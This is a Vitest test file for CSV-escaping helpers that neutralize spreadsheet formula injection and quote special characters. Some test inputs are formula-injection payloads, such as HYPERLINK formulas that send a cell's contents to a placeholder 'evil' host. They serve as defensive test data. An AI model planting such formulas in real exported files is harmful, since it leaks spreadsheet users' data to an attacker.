import { describe, it, expect } from 'vitest';
import { escapeCsvCell, neutralizeCsvFormula } from './csv-escape.utils';

describe('neutralizeCsvFormula', () => {
  it('prefixes a leading = with a single quote', () => {
    expect(neutralizeCsvFormula('=HYPERLINK("http://evil/?"&A1,"open")'))
      .toBe("'=HYPERLINK(\"http://evil/?\"&A1,\"open\")");
  });

  it('prefixes a leading +', () => {
    expect(neutralizeCsvFormula('+1+1')).toBe("'+1+1");
  });

  it('prefixes a leading - when it is not a plain number', () => {
    expect(neutralizeCsvFormula('-HYPERLINK("http://evil/",A1)')).toBe("'-HYPERLINK(\"http://evil/\",A1)");
  });

  it('prefixes a leading @', () => {
    expect(neutralizeCsvFormula('@SUM(1,1)')).toBe("'@SUM(1,1)");
  });

  it('prefixes a leading tab', () => {
    expect(neutralizeCsvFormula('\t=1+1')).toBe("'\t=1+1");
  });

  it('does NOT neutralize a plain negative number — that would break numeric import', () => {
    expect(neutralizeCsvFormula('-5')).toBe('-5');
    expect(neutralizeCsvFormula('-5.25')).toBe('-5.25');
  });

  it('does not neutralize a plain positive number', () => {
    expect(neutralizeCsvFormula('120')).toBe('120');
  });

  it('leaves ordinary text untouched', () => {
    expect(neutralizeCsvFormula('No Frost')).toBe('No Frost');
    expect(neutralizeCsvFormula('')).toBe('');
  });
});

describe('escapeCsvCell', () => {
  it('quotes a value containing a comma and a double quote, doubling the embedded quote', () => {
    expect(escapeCsvCell('Foo, said "bar"')).toBe('"Foo, said ""bar"""');
  });

  it('neutralizes a formula AND quotes it when it also needs quoting', () => {
    expect(escapeCsvCell('=A1,"x"')).toBe('"\'=A1,""x"""');
  });

  it('leaves a plain negative number alone (no prefix, no quoting)', () => {
    expect(escapeCsvCell('-5')).toBe('-5');
  });

  it('prefixes a bare leading = with no other special characters (no quoting needed)', () => {
    expect(escapeCsvCell('=cmd')).toBe("'=cmd");
  });

  it('quotes a value containing only a newline', () => {
    expect(escapeCsvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('passes ordinary text through unchanged', () => {
    expect(escapeCsvCell('No Frost')).toBe('No Frost');
  });
});
